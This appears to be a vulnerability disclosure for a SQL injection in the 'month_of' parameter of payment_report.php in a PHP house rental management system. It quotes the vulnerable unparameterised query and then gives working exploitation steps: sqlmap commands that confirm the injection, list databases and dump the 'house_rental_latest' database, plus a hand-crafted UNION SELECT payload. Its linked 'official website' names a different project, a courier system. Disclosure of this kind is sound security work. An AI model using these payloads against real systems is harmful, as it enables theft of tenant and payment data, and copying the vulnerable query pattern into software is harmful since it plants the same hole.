# SQL Injection Vulnerability at Sourcecodester House Rental Management System

Official Website: https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html

Version: v1.0

route:/payment_report.php?month_of=<payload>

Related Code file: payment_report.php

Injection parameter: month_of

## Vulnerability Analysis
Vulnerable code:
```php
$payments = $conn->query("SELECT p.*, concat(t.lastname,', ',t.firstname,' ',t.middlename) as name, h.house_no FROM payments p INNER JOIN tenants t ON t.id = p.tenant_id INNER JOIN houses h ON h.id = t.house_id WHERE date_format(p.date_created,'%Y-%m') = '$month_of' ORDER BY unix_timestamp(date_created) ASC");
```

The part of this code that is vulnerable to SQL injection is the following SQL query, where the $month_of parameter is directly included in the SQL statement without any sanitization or use of prepared statements.
Because the $month_of parameter is coming directly from user input ($_GET['month_of']). An attacker could manipulate this input to include malicious SQL code.

## Vulnerability Verification and Exploit
We can easily recreate this vulnerability using sqlmap as such:

Below is for basic sql injection testing:

`sqlmap 'http://172.16.76.1/rental/payment_report.php?month_of=2024-06' –batch`

![image](https://github.com/jadu101/CVE/assets/76433661/90efd07f-9db7-479e-a186-18d9a4316666)

Below is the payload that can be used to reproduce withouut sqlmap

```
month_of=2024-06' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6b6271,0x7150726e686a6f7a51496176746f794e58766344546e746a77414663655079734a697847496f4557,0x716b7a6271),NULL-- -
```

Below is the command used to dump database list:

`sqlmap 'http://172.16.76.1/rental/payment_report.php?month_of=2024-06' --batch --dbs`

![image](https://github.com/jadu101/CVE/assets/76433661/042e913b-ac47-4ecd-a41f-c40adc4dbfdb)

Below is the command used to dump data inside house_rental_latest database:

`sqlmap 'http://172.16.76.1/rental/payment_report.php?month_of=2024-06' --batch --dbs -D house_rental_latest --dump`

![image](https://github.com/jadu101/CVE/assets/76433661/464aa85e-990d-4247-9573-c0fb833b3208)









